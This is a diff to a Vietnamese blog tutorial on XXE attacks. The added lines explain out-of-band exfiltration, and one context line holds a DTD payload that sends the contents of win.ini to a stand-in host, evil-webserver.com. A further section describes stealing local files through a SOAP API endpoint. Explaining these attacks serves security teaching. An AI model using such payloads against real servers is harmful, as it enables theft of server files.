@@ -161,7 +161,17 @@ Payload.dtd bên ngoài chứa những thứ sau:
 ‘https://evil-webserver.com/?%data;’>”>
 ```
 
-Hãy lưu ý rằng ```file:///c:/windows/win.ini``` được chứa trong tệp .dtd, chứ không phải trong mã XXE được đưa vào. Đây là một động thái lén lút cho phép chúng ta ẩn tệp nào chúng ta đang cố gắng trích xuất từ ​​nhật ký truy cập máy chủ.
+Hãy lưu ý rằng ```file:///c:/windows/win.ini``` được chứa trong tệp .dtd, chứ không phải trong mã XXE được đưa vào. Đây là một động thái lén lút cho phép chúng ta ẩn tệp nào chúng ta đang cố gắng trích xuất từ nhật ký truy cập máy chủ.
+
+![xxe-out-of-band]({{site.url}}/assets/img/2021/10/23/xxe-out-of-band.png){:width="600px"}
+
+* Client gửi yêu cầu POST với mã XML inject code
+* Máy chủ, thông qua XML parser, phân tích cú pháp XML từ trên xuống dưới, đạt đến injected ENTITY
+* Máy chủ yêu cầu payload.dtd từ https://evil-webserver.com
+* https://evil-webserver.com phản hồi bằng payload.dtd
+* Mã bên trong payload.dtd được parse bởi XML parser, XML parser sẽ đọc nội dung của win.ini và gửi nó dưới dạng tham số trong một yêu cầu HTTP GET trở lại https://evil-webserver.com
+
+Kẻ tấn công có thể xem dữ liệu trích xuất này trong nhật ký máy chủ web của chúng.
 
 ## 4. Pass the SOAP
 
@@ -169,9 +179,16 @@ Lấy ví dụ, một tình huống thực tế từ SRC Team. Một thành viê
 
 Trong trường hợp này, các phương thức API khác nhau có các phần ```<XMLData>``` có thể chứa các ENTITY tags được chèn vào. Vì vậy, việc đưa ra yêu cầu POST request /ConductOrders.asmx endpoint có thể sẽ tạo ra một yêu cầu đến máy chủ web của kẻ tấn công:
 
+![xxe-sc1]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC01.png){:width="600px"}
+
 Kết quả là máy chủ sẽ tìm nạp nội dung của external dtd
 
+![xxe-sc2]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC02.png){:width="600px"}
+
+
 Mã XML này sẽ hướng dẫn XML Parser gửi nội dung của tệp c:\windows\win.ini trong yêu cầu đến máy chủ của kẻ tấn công, bằng cách thêm biến charlie vào cuối yêu cầu, làm cho nó có thể xem được trong nhật ký máy chủ của kẻ tấn công:
+
+![xxe-sc3]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC03.png){:width="600px"}
 
 Và cứ như vậy, bất kỳ tệp cục bộ nào mà máy chủ web có thể đọc được đều là của anh ta để đánh cắp. 
 
